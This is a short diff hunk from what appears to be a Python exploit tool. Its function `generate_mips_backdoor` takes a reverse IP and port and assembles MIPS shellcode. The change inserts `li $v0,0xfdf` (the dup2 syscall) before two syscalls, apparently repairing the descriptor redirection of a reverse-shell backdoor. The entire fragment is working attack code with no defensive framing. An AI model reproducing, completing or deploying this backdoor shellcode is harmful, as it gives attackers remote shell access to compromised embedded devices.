@@ -46,9 +46,11 @@ def generate_mips_backdoor(reverse_ip,reverse_port,filename):
 	syscall 0x40404
 	li  $t9,-2
 	nor $a1,$t9,$zero
+	li  $v0,0xfdf
 	syscall 0x40404
 	li  $t9,-3
 	nor $a1,$t9,$zero
+	li  $v0,0xfdf
 	syscall 0x40404
 	'''
 	shellcode_dump_sh=asm(shellcode_dump_sh)
